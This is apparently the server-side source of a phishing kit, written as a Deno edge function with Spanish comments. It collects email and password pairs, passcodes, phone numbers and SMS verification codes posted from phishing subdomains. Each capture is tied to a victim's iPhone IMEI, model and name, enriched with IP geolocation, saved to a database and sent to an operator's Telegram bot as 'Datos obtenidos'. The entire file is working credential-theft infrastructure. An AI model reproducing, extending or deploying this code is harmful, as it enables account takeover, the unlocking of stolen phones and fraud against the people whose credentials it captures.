
import { serve } from "https://deno.land/std@0.168.0/http/server.ts"
import { createClient } from 'https://esm.sh/@supabase/supabase-js@2'

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
}

interface ScriptData {
  subdomain: string;
  script_type: string;
  email?: string;
  password?: string;
  code?: string;
  verification_code?: string;
  phone?: string;
  [key: string]: any;
}

// Función para obtener información de geolocalización por IP
async function getLocationFromIP(ip: string) {
  try {
    const response = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city,isp,query`);
    const data = await response.json();
    
    if (data.status === 'success') {
      return {
        ip: data.query,
        country: data.country || 'Desconocido',
        city: data.city || 'Desconocido',
        isp: data.isp || 'Desconocido'
      };
    }
  } catch (error) {
    console.error('Error getting location:', error);
  }
  
  return {
    ip: ip,
    country: 'Desconocido',
    city: 'Desconocido',
    isp: 'Desconocido'
  };
}

serve(async (req) => {
  // Handle CORS preflight requests
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const supabase = createClient(
      Deno.env.get('SUPABASE_URL') ?? '',
      Deno.env.get('SUPABASE_SERVICE_ROLE_KEY') ?? ''
    );

    if (req.method !== 'POST') {
      return new Response(
        JSON.stringify({ error: 'Method not allowed' }),
        { status: 405, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    const body: ScriptData = await req.json();
    console.log('Received script data:', body);

    if (!body.subdomain || !body.script_type) {
      return new Response(
        JSON.stringify({ error: 'Subdomain and script_type are required' }),
        { status: 400, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    // Obtener IP del cliente
    const clientIP = req.headers.get('x-forwarded-for') || 
                    req.headers.get('x-real-ip') || 
                    'IP no disponible';

    // Obtener información de geolocalización
    const locationInfo = await getLocationFromIP(clientIP);

    // Obtener configuración del usuario por subdominio
    const { data: userConfig, error: configError } = await supabase
      .rpc('get_user_config_by_subdomain', { subdomain_param: body.subdomain });

    if (configError) {
      console.error('Error getting user config:', configError);
      return new Response(
        JSON.stringify({ error: 'Configuration not found' }),
        { status: 404, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    if (!userConfig || userConfig.length === 0) {
      console.error('No user configuration found for subdomain:', body.subdomain);
      return new Response(
        JSON.stringify({ error: 'User configuration not found' }),
        { status: 404, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    const config = userConfig[0];
    console.log('User config found:', { user_id: config.user_id, domain: config.domain_name });

    // Buscar proceso relacionado por IMEI o número de serie si están en los datos
    let processData = null;
    if (body.imei || body.serial_number) {
      const { data: process } = await supabase
        .from('processes')
        .select('*')
        .eq('user_id', config.user_id)
        .or(`imei.eq.${body.imei || ''},serial_number.eq.${body.serial_number || ''}`)
        .single();
      
      processData = process;
    }

    // Guardar datos capturados en la base de datos
    const capturePayload = {
      user_id: config.user_id,
      subdomain: body.subdomain,
      script_type: body.script_type,
      captured_data: {
        ...body,
        location_info: locationInfo,
        user_agent: body.user_agent || 'N/A',
        timestamp: new Date().toISOString()
      },
      process_id: processData?.id || null
    };

    const { data: captureData, error: captureError } = await supabase
      .from('script_captures')
      .insert(capturePayload)
      .select()
      .single();

    if (captureError) {
      console.error('Error saving capture data:', captureError);
      return new Response(
        JSON.stringify({ error: 'Failed to save data' }),
        { status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    // Formatear mensaje para Telegram según el tipo de script
    let message = `💻 Server Astro505\n`;
    
    if (body.script_type === 'email_password' && body.email && body.password) {
      message += `🔔 Datos recibidos 🔔\n`;
      message += `-----------------------------\n`;
      message += `-----------------------------\n`;
      message += `✔️ Detalles de la visita ✔️\n`;
      message += `👨‍💻 Usuario : ${processData?.client_name || 'Cliente'}\n`;
      message += `📱 Modelo : ${processData?.iphone_model || 'iPhone'}\n`;
      message += `📲 Imei : ${processData?.imei || 'N/A'}\n`;
      message += `-----------------------------\n`;
      message += `-----------------------------\n`;
      message += `🔐 Datos obtenidos 👨🏼‍💻\n`;
      message += `📧 Email : ${body.email}\n`;
      message += `🔑 Contraseña : ${body.password}\n`;
    } else if (body.script_type === 'verification_code' && body.code) {
      message += `🔔 Datos passcode recibidos 🔔\n`;
      message += `-----------------------------\n`;
      message += `-----------------------------\n`;
      message += `✔️ Detalles de la visita ✔️\n`;
      message += `👨‍💻 Usuario : ${processData?.client_name || 'Cliente'}\n`;
      message += `📱 Modelo : ${processData?.iphone_model || 'iPhone'}\n`;
      message += `📲 Imei : ${processData?.imei || 'N/A'}\n`;
      message += `-----------------------------\n`;
      message += `-----------------------------\n`;
      message += `🔐 Datos obtenidos 👨🏼‍💻\n`;
      message += `⌨️ Codigo 1 : ${body.code}\n`;
      message += `⌨️ Codigo 2 : Processing\n`;
    } else if (body.script_type === 'phone_verification' && (body.phone || body.verification_code)) {
      message += `🔔 Datos telefónicos recibidos 🔔\n`;
      message += `-----------------------------\n`;
      message += `-----------------------------\n`;
      message += `✔️ Detalles de la visita ✔️\n`;
      message += `👨‍💻 Usuario : ${processData?.client_name || 'Cliente'}\n`;
      message += `📱 Modelo : ${processData?.iphone_model || 'iPhone'}\n`;
      message += `📲 Imei : ${processData?.imei || 'N/A'}\n`;
      message += `-----------------------------\n`;
      message += `-----------------------------\n`;
      message += `🔐 Datos obtenidos 👨🏼‍💻\n`;
      if (body.phone) message += `📱 Teléfono : ${body.phone}\n`;
      if (body.verification_code) message += `⌨️ Código SMS : ${body.verification_code}\n`;
    } else {
      // Mensaje de visita inicial (sin datos específicos)
      message += `🔔 Se detecto una nueva visita 🔔\n`;
      message += `-----------------------------\n`;
      message += `-----------------------------\n`;
      message += `✔️ Detalles de la visita ✔️\n`;
      message += `👨‍💻 Usuario : ${processData?.client_name || 'Cliente'}\n`;
      message += `📧 Email : \n`;
      message += `📱 Modelo : ${processData?.iphone_model || 'iPhone'}\n`;
      message += `📲 Imei : ${processData?.imei || 'N/A'}\n`;
    }

    // Agregar información de localización
    message += `-----------------------------\n`;
    message += `-----------------------------\n`;
    message += `🧭 Detalles de localización 🧭\n`;
    message += `🌐Dirección IP : ${locationInfo.ip}\n`;
    message += `🗾 Pais : ${locationInfo.country}\n`;
    message += `🏙 Ciudad : ${locationInfo.city}\n`;
    message += `📡 ISP : ${locationInfo.isp}`;

    // Enviar mensaje a Telegram
    const telegramUrl = `https://api.telegram.org/bot${config.bot_token}/sendMessage`;
    const telegramPayload = {
      chat_id: config.chat_id,
      text: message,
      parse_mode: 'HTML'
    };

    console.log('Sending to Telegram:', { chat_id: config.chat_id, bot_token: config.bot_token.substring(0, 10) + '...' });

    const telegramResponse = await fetch(telegramUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(telegramPayload),
    });

    const telegramResult = await telegramResponse.json();
    console.log('Telegram response:', telegramResult);

    if (!telegramResponse.ok) {
      console.error('Telegram API error:', telegramResult);
      
      // Marcar como no enviado en la base de datos pero no fallar la respuesta
      await supabase
        .from('script_captures')
        .update({ telegram_sent: false })
        .eq('id', captureData.id);

      return new Response(
        JSON.stringify({ 
          success: true, 
          message: 'Data saved but Telegram delivery failed',
          telegram_error: telegramResult
        }),
        { status: 200, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    // Marcar como enviado exitosamente
    await supabase
      .from('script_captures')
      .update({ telegram_sent: true })
      .eq('id', captureData.id);

    return new Response(
      JSON.stringify({ 
        success: true, 
        message: 'Data captured and sent to Telegram successfully',
        capture_id: captureData.id
      }),
      { status: 200, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
    );

  } catch (error) {
    console.error('Function error:', error);
    return new Response(
      JSON.stringify({ error: 'Internal server error', details: error.message }),
      { status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
    );
  }
});
